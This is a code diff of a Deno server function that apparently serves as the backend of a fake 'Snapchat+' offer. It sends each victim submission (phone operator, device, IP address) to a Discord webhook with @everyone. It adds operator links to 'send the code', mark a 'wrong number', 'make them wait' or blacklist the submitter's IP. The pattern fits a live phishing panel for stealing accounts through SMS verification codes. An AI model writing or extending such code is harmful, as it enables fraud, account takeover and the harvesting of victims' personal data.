@@ -1,5 +1,7 @@
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 
+const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
+
 Deno.serve(async (req) => {
   const authHeader = req.headers.get("authorization") || "";
   const token = authHeader.replace("Bearer ", "");
@@ -42,6 +44,12 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
+  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
+  const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
+  const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
+  const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
+  const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(finalIp)}`;
+
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
     color: operatorColors[operateur] || 16776960,
@@ -55,53 +63,20 @@ Deno.serve(async (req) => {
       { name: "💾 Appareil", value: finalDevice, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
+      {
+        name: "⚡ Actions",
+        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
+        inline: false
+      },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
-  const components = [
-    {
-      type: 1,
-      components: [
-        {
-          type: 2,
-          style: 3,
-          label: "✅ Envoyer le code",
-          custom_id: `send:${submissionId}`
-        },
-        {
-          type: 2,
-          style: 4,
-          label: "❌ Mauvais numéro",
-          custom_id: `wrong:${submissionId}`
-        },
-        {
-          type: 2,
-          style: 3,
-          label: "⏳ Faire patienter",
-          custom_id: `wait:${submissionId}`
-        },
-        {
-          type: 2,
-          style: 4,
-          label: "🚫 Blacklist",
-          custom_id: `blacklist:${submissionId}`
-        }
-      ]
-    }
-  ];
-
-  const botToken = Deno.env.get("DISCORD_BOT_TOKEN");
-  const channelId = Deno.env.get("DISCORD_CHANNEL_ID");
-
-  await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
+  await fetch(DISCORD_WEBHOOK, {
     method: "POST",
-    headers: {
-      "Authorization": `Bot ${botToken}`,
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ content: "@everyone", embeds: [embed], components }),
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
   });
 
   await base44.asServiceRole.entities.ActionLog.create({
